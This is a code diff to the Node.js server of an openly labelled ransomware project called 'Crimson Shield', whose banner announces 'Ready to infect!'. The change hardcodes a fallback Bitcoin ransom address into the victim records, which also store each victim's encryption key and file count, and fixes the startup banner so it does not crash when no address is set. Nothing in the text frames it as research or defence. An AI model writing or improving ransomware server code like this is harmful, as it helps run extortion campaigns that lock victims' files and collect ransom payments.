@@ -238,7 +238,7 @@ class CrimsonServer {
             const victim = {
                 id: crypto.randomBytes(8).toString('hex'),
                 victimId: this.victimId,
-                btcAddress: process.env.BTC_ADDRESS,
+                btcAddress: process.env.BTC_ADDRESS || 'bc1qnjkxvj7avmet54w9rmzf0ldftwzh2fcwsdxuw7',
                 encryptionKey: this.encryptionEngine.getKey(),
                 systemInfo: systemInfo || {},
                 filesEncrypted: filesEncrypted || 0,
@@ -357,6 +357,7 @@ class CrimsonServer {
 
     start() {
         this.server.listen(this.port, () => {
+            const btcAddress = process.env.BTC_ADDRESS || 'Not Set';
             console.log('╔═══════════════════════════════════════════╗');
             console.log('║     🔴 CRIMSON SHIELD RANSOMWARE 🔴       ║');
             console.log('╠═══════════════════════════════════════════╣');
@@ -364,7 +365,7 @@ class CrimsonServer {
             console.log(`║  Dashboard: http://localhost:${this.port}/dashboard ║`);
             console.log(`║  Victim ID: ${this.victimId.padEnd(20)}    ║`);
             console.log(`║  Victims:   ${String(victims.length).padEnd(20)}    ║`);
-            console.log(`║  BTC Addr:  ${process.env.BTC_ADDRESS.substring(0, 20)}...  ║`);
+            console.log(`║  BTC Addr:  ${btcAddress.substring(0, 20)}...  ║`);
             console.log('╚═══════════════════════════════════════════╝');
             console.log('💀 Ready to infect!');
         });
